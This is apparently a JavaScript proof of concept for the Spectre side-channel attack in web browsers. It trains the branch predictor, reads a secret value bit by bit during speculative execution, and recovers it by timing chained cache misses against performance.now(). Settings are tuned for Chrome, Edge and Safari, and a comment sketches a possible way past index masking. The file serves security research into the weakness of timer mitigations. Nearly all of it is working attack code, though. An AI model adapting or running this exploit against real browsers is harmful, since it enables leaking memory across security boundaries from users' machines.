/*
 * The general flow of this POC is to have a known value stored in a JS variable.
 * The variable bits will be queried in a speculatively executed branch (misprediction)
 * and inside that branch the cache state of other JS array cells will be affected based of the bit value queried (these cells will enter the cache).
 * These affected cells are specially crafted so that each one points to the next one so that when we later
 * access the the cells one after the other by following the pointers we will have an amplified time difference
 * between a state where each of the cells is cached compared to the state where each of the cells is not cached.
 * The time difference should be roughly the time to fetch a cache-line from the RAM times the amount of cells.
 * In addtion we wait for performance.now() to tick in a busy loop and start checking the probe array right after the tick.
 * From that point we count the number iterations inside a busy loop until performance.now() ticks again.
 * We then do the whole described process a number of times in a loop and compute the mean value of the ticks we got in each iteration.
 * We can then see a clear difference in the mean value between a state where the probe pointer array was all cached or all non-cached
 * and therefore can conclude whether the bit value was 1 or 0.
 * This process allows us to read a memory value we are able to speculatively access in a speculatively predicted branch in ~1 second per bit.
 * We were not able to access memory that is not already accessible to our code anyway due to the array index masking Spectre mitigation.
 * Although such acccess could be maybe achived by training a function to access a far member of an object passed to it and then passing a short
 * object to this function in which the member of the same name is much closer to the beginning of the object so the value that will be speculatively read
 * is of a larger offset from the beginning of the object (beyond the object limits) and this memory slot could potentially hold some sort of sensitive information.
 * This POC shows that while the performace.now() resolution reduction and jitter added as Spectre mitigations are very effective at slowing
 * down Spectre expolits, they do not actually help to prevent them. The actual prevention is done by index masking and/or process site isolation.
 */

// temp variable so stuff won't get opted out and also for keeping function from being inlined in JIT
var temp = [];


// Array setup functions
// This function prepares the arrays for cache miss chaining so that each cell points to the next one.
// We use cells in page offsets from one another to both have them in a similar cache-set position (6 of the bit determining the cache set are the same)
// and to prevent pre-fetching of other cells when accessing one of them.
// cache miss chaining works well as opposed to sequentially accessing all the cells as when accessing the cells sequentially the cache requests and misses
// are handled many at the same time instead of one after the other.
// We use cells in page offests - 4096 bytes apart - 1024 int cells apart for 32 bit ints.
function _normalArraySetup(mainArr, base, size) {
    for (i = base; i < base + size; i++) {
        mainArr[i] = i + 1024;
    }
}


/*
 * This code uses multiple subarrays with different roles of a single one big allocated array.
 * This gives us partial control over the addresses differences of the cells in the array and thus the relevant CPU cache sets they belong to.
 * The mainArray structure:
 * int cells: 0 - flushArraySize: flush array:
 *   access to relevant cells in this part of the array will evict the relevant cache sets we want to clear. For more info on the flush functionality please see: _cacheFlush()
 * int cells: cmpBase - cmpBase + probeArrSize: cmp array:
 *   The cmp array is used for having multiple copies of values higher than 1000 that are uncached.
 *   Each of them will be used to compare to 1000 in the code and since they are not cached, the branch will need to be speculated with branch prediction. The final non-speculated result will be to
 *   not execute the branch. We show that in the meanwhile the branch will be executed and the code inside it will affect the cache state of the probe array.
 * int cells: probeBase - probeBase + (2 * probeArrSize) + 256: probe array:
 *   The content of this part is split into 2 parts and some empty space.
 *   content of 2 parts:
 *   Each index value is a pointer to the cell one page exactly ahead of that cell so that if the whole part is
 *   to be read pointer to pointer and it is all uncached then the total amount of time it would take is a single RAM fetch to CPU cache time * number of pointed cells in the part.
 *   This allows us to significantly amplify the cache miss time for each secret value probed in this Spectre POC. The cells are a page apart and the next one is known only after reading
 *   the value of the previous one thus prefetches and simultaneous reads are prevented.
 *   each of the 2 parts is responsible for a chain of reads that are supposed to be CPU cached if the relevant bit is 0 or 1. The ratio between the time it takes to resolve the 2 different chains determines
 *   the value of the bit read inside the speculative execution.
 *   We want to use different cache sets explicitly for the 2 different parts so that probing one of them will not affect the cache state of the other.
 *   In order to do so let's examine the physical address of the beginning of the first part. Let's define the lower 12 bits as: x0, x1, x2,x3, x4, x5, x6, x7, x8, x9, x10, x11.
 *   The cache set is determined by the bits starting from bit 6 and up, as the lower 6 bits are used for offset inside the cache line (assuming a 512 bit cache line). Bits above the lower 12 bits are determined by the physical-virtual memory mapping and we have no control over them from the JS code.
 *   For the first part of the probe array (used for bit value 0) we then use cells that are page apart from each other.
 *   This way the lower 12 bits are not changed between the different cells of this part so that addresses with this exact combination of x6..x11 will use distict cache sets from addresses with diffent x6..x11 combinations.
 *   the second part (used for bit value 1) will also use cells which are complete pages apart
 *   but will use an offset of half a page for the first cell so that x11 bit will be different for cells in this part from the previous part and cells from one part will never use the same cache sets as cells from the other.
 * int cells: trainProbeBase - trainProbeBase + trainProbeArrSize: training probe array:
 *   training probe array is used in the speculative condition function just as a placeholder for probing something while training the branch predicrtion.
 * int cells: trainCmpBase - trainCmpBase + probeArrSize: training cmp array:
 *   This array holds 0 values so that the comparison condition will always enter the branch in order to train the branch prediction.
 */

/*
 * The main POC function:
 * flushArrSize - The size of the array used to flush the cache when accessing it.
 * probeArrSize - The size of the probe array used for cache miss chaining.
 * iterCnt - The number of times to count the loops until the next performace.now() tick to produce the mean value to reduce the jitter noise.
 * restVal - The value we read in the speculative branch as the "secret" data and later we restore this value by timing accesses to the probe array.
 * bitRepeat - The number of times we repeat the process for each bit. Normally this will remain as 1.
 */
function fullTest(flushArrSize, probeArrSize, iterCnt, restVal, bitRepeat, threshold, useSpeculative) {
    var cmpArrSize = probeArrSize;
    var trainProbeArrSize = 2 ** 10;
    var lastTick = performance.now();
    var curTick = performance.now();

    // arrays for holding results
    var bitIsZeroCntArr = new Int32Array(new ArrayBuffer(2 * 4 * iterCnt));
    var bitIsOneCntArr = new Int32Array(new ArrayBuffer(2 * 4 * iterCnt));
    var ratioArr = new Float32Array(new ArrayBuffer(4 * 32 * bitRepeat));

    // this is the main array - we will use offsets into it to "simulate" multiple arrays, so we can control their relative addresses
    var mainArrAccessor = new Int32Array(new ArrayBuffer((flushArrSize * 4) + (probeArrSize * 2 * 4) + (cmpArrSize * 4) + (trainProbeArrSize * 2 * 4) + 4096));

    var dataArr = new Int32Array(new ArrayBuffer(4 * 10));
    //index 0 is here so we can access it to get all the dataArr metadata in the cache before starting to work with it
    dataArr[0] = 0;
    //index 1 holds the original "secret" value
    dataArr[1] = restVal;
    //index 2 will later hold the value we are able to restore by timing accesses to the probe arrays
    dataArr[2] = 0;

    // offsets into the main array that will "simulate" multiple arrays
    // all array sizes should be multiple of a page size
    var flushBase = 0;
    var cmpBase = flushArrSize;
    // probe array is split into 2 parts:
    // The first part is used for bit value 0 and uses cells with 1024 bytes page offsets from the beginning of the main array.
    // the second part is used for bit value 1 and uses cells with a page offset of 3072 bytes from the beginning of the main array.
    // This makes the cells of the second part have a different x11 value and therefore use distinct cache sets from the first part.
    // Both parts use cells that are complete pages apart from one cell to the next one.
    var probeBase = cmpBase + probeArrSize + 256;
    // The training probe array used for training the branch prediction and must not affect the cache state of the 2 parts of the regular probe array.
    // Therefore it is using cells at a 2048 bytes page offest from the beginning of the main array. This makes the cells have different x10 or x11
    // bits from the cells of either of the 2 parts of the probe array.
    // It is also using cells that are complete pages apart from one the cell to the next one.
    var trainProbeBase = probeBase + (2 * probeArrSize) + 256;
    // The training cmp array is actually a single cell with the value 0
    // The value 0 is used for having a value which satisfies the branch condition and is used for training the branch predictor.
    var trainCmpBase = trainProbeBase + trainProbeArrSize;

    var bitIsZeroCnt = 0;
    var bitIsOneCnt = 0;
    var idx = 0;

    var tempAccum = 0;

    // intialize all arrays so that int in the array will hold the index of a cell that is a page ahead of it
    _normalArraySetup(mainArrAccessor, flushBase, flushArrSize);
    _normalArraySetup(mainArrAccessor, probeBase, probeArrSize * 2);
    _normalArraySetup(mainArrAccessor, trainProbeBase, 2 * trainProbeArrSize);
    _normalArraySetup(mainArrAccessor, cmpBase, cmpArrSize);// the cmp array can simply be initialized with any value larger than 1000, for simplicity it is initialized with the same function as the other parts of the array
    mainArrAccessor[trainCmpBase] = 0;

    for (bitR = 0; bitR < bitRepeat; bitR++) { // multiple tries for each bit, when we finish we'll take the average of all the tries
        for (bit = 31; bit >= 0; bit--) {      // iterate over all 32 bits...
            for (j = 0; j < iterCnt; j++) {    // multiple "experiments" for each bit - so that the jitter noise is reduced
                // flush the cache
                tempAccum += _cacheFlush(mainArrAccessor, flushBase, flushArrSize);

                //probe read - multiple times so we could chain the misses/hits
                for (prOffset = 0; prOffset < probeArrSize; prOffset += 1024) {
                    // branch prediction training
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    // misspredicted branch read to insert a single probe array cell into the cache based on the read bit value
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, probeBase, prOffset, probeArrSize, cmpBase, dataArr, 1, bit, useSpeculative);
                }

                /*
                 * The part of the array that corresponds with the bit value 1 will be in a page
                 * offset that is half a page (512 ints) different from the part that corresponds with the bit value 0
                 * (meaning 2048 bytes appart from the 0 value part of the array, and also 3072 bytes appart from the compare part of the array)
                 * so that when we probe them they won't collide with each other in the cache.
                 * That is all the cells in the probe array part used for bit value 1 will use a different subset of the cache from the cells in the probe array part used for bit value 0.
                 */

                /*
                 * This part is going to probe for the part of the array corresponding to bit value 1
                 */
                idx = probeBase + probeArrSize + 512; //probeBase + probeArrSize + 512 is the index of the beginning of the second part of the probe array used for bit value 1

                // timing
                // Wait for performance.now() to tick before starting the probing process.
                lastTick = curTick = performance.now();
                while  (lastTick == (curTick = performance.now()));
                lastTick = curTick;

                // probe
                // This is where we access all the probe array part cells chained one after the other either in a cached state or a non-cached state.
                while (idx < probeBase + 2 * probeArrSize) {
                    idx = mainArrAccessor[idx];
                }

                // count and wait for change
                // The count should be smaller until the next tick if cells were not cached as probing took a longer time.
                while (lastTick == (curTick = performance.now())) {
                    bitIsOneCnt++;
                }

                // log result
                // We execute this logic twice for each iteration so we store the result now in index 2 * j and later we use 2 * j + 1
                bitIsOneCntArr[2 * j] = bitIsOneCnt;
                //prevent opt-out of the code
                temp.push(idx);

                /*
                 * This part is going to probe for the part of the array corresponding to bit value 0
                 */
                idx = probeBase;

                // timing
                //Wait for performance.now() to tick before starting the probing process.
                lastTick = curTick = performance.now();
                while  (lastTick == (curTick = performance.now())); lastTick = curTick;

                // probe
                //This is where we access all the probe array part cells chained one after the other either in a cached state or a non-cached state.
                while (idx < probeBase+probeArrSize) {
                    idx = mainArrAccessor[idx];
                }

                // count and wait for change
                // The count should be smaller until the next tick if cells were not cached as probing took a longer time.
                while (lastTick == (curTick = performance.now())) {
                    bitIsZeroCnt++;
                }

                // log result
                // We execute this logic twice for each iteration so we store the result now in index 2 * j and later we use 2 * j + 1
                bitIsZeroCntArr[2 * j] = bitIsZeroCnt;
                //prevent opt-out of the code
                temp.push(idx);

                // restore state
                bitIsOneCnt = 0;
                bitIsZeroCnt = 0;

                /*
                 * Again but opposite order
                 * First check that probe array part for bit value 0 and the check the part for bit value 1.
                 */

                // flush the cache
                tempAccum += _cacheFlush(mainArrAccessor, flushBase, flushArrSize);

                //probe read
                //probe read - multiple times so we could chain the misses/hits
                for (prOffset = 0; prOffset < probeArrSize; prOffset += 1024) {
                    // branch prediction training
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, trainProbeBase, 0, trainProbeArrSize, trainCmpBase, dataArr, 0, 0, useSpeculative);
                    // misspredicted branch read to insert a single probe array cell into the cache based on the read bit value
                    tempAccum += _speculativeAccessFuncWithBitOffset(mainArrAccessor, probeBase, prOffset, probeArrSize, cmpBase, dataArr, 1, bit, useSpeculative);
                }

                /*
                 * This part is going to probe for the part of the array corresponding to bit value 0
                 */
                idx = probeBase;

                // timing
                // Wait for performance.now() to tick before starting the probing process.
                lastTick = curTick = performance.now();
                while  (lastTick == (curTick = performance.now())); lastTick = curTick;

                // probe
                // This is where we access all the probe array part cells chained one after the other either in a cached state or a non-cached state.
                while (idx < probeBase + probeArrSize) {
                    idx = mainArrAccessor[idx];
                }

                // count and wait for change
                // The count should be smaller until the next tick if cells were not cached as probing took a longer time.
                while (lastTick == (curTick = performance.now())) {
                    bitIsZeroCnt++;
                }

                // log result
                bitIsZeroCntArr[2 * j + 1] = bitIsZeroCnt;
                temp.push(idx);

                /*
                 * This part is going to probe for the part of the array corresponding to bit value 1
                 */
                idx = probeBase + probeArrSize + 512; //probeBase + probeArrSize + 512 is the index of the beginning of the second part of the probe array used for bit value 1

                // timing
                // Wait for performance.now() to tick before starting the probing process.
                lastTick = curTick = performance.now();
                while  (lastTick == (curTick = performance.now()));
                lastTick = curTick;

                // probe
                // This is where we access all the probe array part cells chained one after the other either in a cached state or a non-cached state.
                while (idx < probeBase + 2 * probeArrSize) {
                    idx = mainArrAccessor[idx];
                }

                // count and wait for change
                // The count should be smaller until the next tick if cells were not cached as probing took a longer time.
                while (lastTick == (curTick = performance.now())) {
                    bitIsOneCnt++;
                }

                // log result
                bitIsOneCntArr[2 * j + 1] = bitIsOneCnt;
                temp.push(idx);

                // restore state
                bitIsOneCnt = 0;
                bitIsZeroCnt = 0;

            }
            ratio = jStat.mean(bitIsZeroCntArr) / jStat.mean(bitIsOneCntArr);
            if (iterCnt > 1) {
                console.log("ratio: " + ratio);
                //console.log("zero var: " + jStat.variance(bitIsZeroCntArr));
                //console.log("one var: " + jStat.variance(bitIsOneCntArr));
            }
            //console.log("bitIsZeroCnt: " + jStat.mean(bitIsZeroCntArr));
            //console.log("bitIsOneCnt: " + jStat.mean(bitIsOneCntArr));
            ratioArr[bitR * 32 + bit] = ratio;
        }
    }
    for (bit = 31; bit >= 0; bit--) {
        ratioAvg = 0;
        for (bitR = 0; bitR < bitRepeat; bitR++) {
            ratioAvg += ratioArr[32 * bitR + bit];
        }
        ratioAvg = ratioAvg / bitRepeat;
        // when experimenting with this code we noticed a bias in the timing results when using different browsers and configurations,
        // this is why a configurable threshold is needed rather than just using the value 1
        if (ratioAvg  > threshold) {
            dataArr[2] = (dataArr[2] << 1) | 0;
        }
        else {
            dataArr[2] = (dataArr[2] << 1) | 1;
        }
    }
    if (iterCnt > 1) {
        console.log("original value: " + dataArr[1].toString(2));
        console.log("restored value: " + dataArr[2].toString(2));
        console.log("tempAccum: " + tempAccum);
    }
}


/*
 * flush the cache by accessing the main array at dedicated offfsets
 * (so those offsets are cached instead)
 */
function _cacheFlush(mainArrAccessor, flushBase, flushArrSize) {
    mainArrAccessor[flushBase]++;
    // sum is computed just to make sure that non of the function logic is opted-out
    var sum = 0;
    for (k = flushBase; k < flushBase + flushArrSize; k += 1024) {
        // flush compare array part - uses offest 0 of complete pages from the main array base for distinct x10 and x11 address bits values.
        sum += mainArrAccessor[k];
        // flush the second probe array part (bit value 1) - uses offest 768 (3072 bytes) from complete pages from the main array base for distinct x10 and x11 address bits values.
        sum += mainArrAccessor[k + 768];
        // flush the first probe array part (bit value 0) - uses offest 256 (1024 bytes) from complete pages from the main array base for distinct x10 and x11 address bits values.
        sum += mainArrAccessor[k + 256];
    }
    return sum;
}


/*
 * This function has 2 main goals.
 * 1. when passed the training cmp array and the training probe array it is
 *    used for training the branch prediction to indeed enter branch under the
 *    "if" condition.
 * 2. when passed the cmp array and the regular probe array it is used to
 *    speculatively execute (after branch prediction training) probe array
 *    accesses (insert into CPU cache) in indices based on the value read
 *    inside the speculative exection.
 */
function _speculativeAccessFuncWithBitOffset(mainArrAccessor, // This is the global array used for all sub arrays
                                             probeBase,       // This is the beginning of the 2 parts of the probe array. one part for bit value 0 and the other for bit value 1.
                                                              // In case of training just a different part of the global array so it won't affect the caching of the real probe arrays.
                                             probeOffset,     // This is the index offset inside the probe array. we want to insert into the cache many cells for the cache miss chaining.
                                             probeArrSize,    // This is the probe array size so we can access either the part of the array that is relevant for bit value 0 or the other one for bit value 1 (offset of probeArrSize + 512 from the 0 bit value part)
                                             cmpBase,         // This is the part of the main array used for uncached values larger than 1000 so that we will have mis-predicted execution of the branch.
                                                              // In case of training just a part of the array with 0 values to train the function to predict a true result for the if condition.
                                             dataArr,         // The array that holds the "secret" value to read inside index 1.
                                             readIndex,       // The index to use inside the dataArr for the "secret" value to read.
                                             bitOffset,       // The current bit to read inside the 32 bit int.
                                             useSpeculative   // Chooses if the probe access will be speculative or not
                                             )
{
    // Access the dataArr so its metadata is cached, then call performance.now() so we get a barrier,
    // This will make sure that dataArr and its metadata is cached when the specultive code tries to access it.
    var t = dataArr[0] * bitOffset;
    if (useSpeculative) {
       compareValue = 1000;
    }
    else {
       compareValue = Number.MAX_VALUE;
    }
    performance.now();
    // This is the speculative code that will access the dataArr.
    // Notice that the "compare" part of the main array that is not cached when we access it,
    // While the dataArr is cached, this way the speculative code will reach the code accessing the
    // probe part of the main array.
    if (mainArrAccessor[cmpBase + probeOffset] < compareValue) {
        var bit  = (dataArr[readIndex] >>> bitOffset) & 1;
        var indx = probeBase + probeOffset + ((probeArrSize + 512) * bit);
        t        = mainArrAccessor[indx] + t;
    }

    // Some extra code to prevent inlining of this function.
    // If this function is inlined the speculative training will not work
    // as the training will be for a different branch of each inlined instance.
    var local_temp = 0;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    local_temp++;
    local_temp = local_temp * t * 2;
    temp[0] = local_temp;

    return t;
}


function execute() {
    console.log("starting warmup");
    // warmup to get JIT and cache state for all relevant code and data
    for (m = 0; m < 100; m++) {
        fullTest(8, 8, 1, 0, 1);
    }
    console.log("warmup done");
    // Internet Explorer 6-11
    var isIE = /*@cc_on!@*/false || !!document.documentMode;

    // Edge 20+
    var isEdge = !isIE && !!window.StyleMedia;

    // Chrome 1+
    var isChrome = !!window.chrome && !!window.chrome.webstore;
    if (isChrome) {
        useSpeculative = true;
        probeArrSize   = (2**19);
        flushArrSize   = 2*(2**20);
        iterCnt        = 500;
        valueToRestore = 1717986918;
        bitRepeat      = 1;
        threshold      = 0.95;
    }
    else if (isEdge) {
        useSpeculative = false;
        probeArrSize   = (2**19);
        flushArrSize   = 2*(2**20);
        iterCnt        = 50;
        valueToRestore = 1717986918;
        bitRepeat      = 1;
        threshold      = 1;
    }
    else { // assume we are on safari
        useSpeculative = false;
        probeArrSize   = (2**19);
        flushArrSize   = 2*(2**20);
        iterCnt        = 200;
        valueToRestore = 1717986918;
        bitRepeat      = 1;
        threshold      = 0.99;
    }

    for (m = 0; m < 10; m++) {
        fullTest(flushArrSize,
                 probeArrSize,
                 iterCnt,
                 valueToRestore,
                 bitRepeat,
                 threshold,
                 useSpeculative);
    }
}
